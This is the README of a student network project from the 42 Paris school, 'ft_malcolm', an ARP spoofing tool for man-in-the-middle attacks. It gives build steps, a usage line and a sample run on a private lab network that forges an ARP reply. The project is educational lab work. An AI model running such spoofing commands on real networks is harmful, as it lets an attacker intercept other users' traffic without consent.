# ft_malcolm

Man in the middle ARP attack.
Intercepts an ARP request and returns a forged address to the provider.

42 Paris school network project.

## Build

Compilation :
```
make
```

Clean objects files :
```
make clean
```

Clean entire project :
```
make fclean
```

## Usage

```
ft_malcolm [-lv] spoof_ip spoof_mac target_ip target_mac
  -l  : sending loop
  -v  : verbose mode
```

## Example

```
sudo ./ft_malcolm -v 192.168.56.105 77:77:77:77:77:77 192.168.56.103 08:00:27:66:12:7f
Input :
source mac address : 77:77:77:77:77:77
source IP address : 192.168.56.105
dest mac address : 08:00:27:66:12:7F
dest IP address : 192.168.56.103
Found available interface : eth0
An ARP request has been broadcast.
        source mac address : 08:00:27:66:12:7F
        source IP address : 192.168.56.103
        target mac address : 00:00:00:00:00:00
        target IP address : 192.168.56.102
Sending an ARP reply to the target address with spoofed source
        source mac address : 77:77:77:77:77:77
        source IP address : 192.168.56.105
        target mac address : 08:00:27:66:12:7F
        target IP address : 192.168.56.103
```
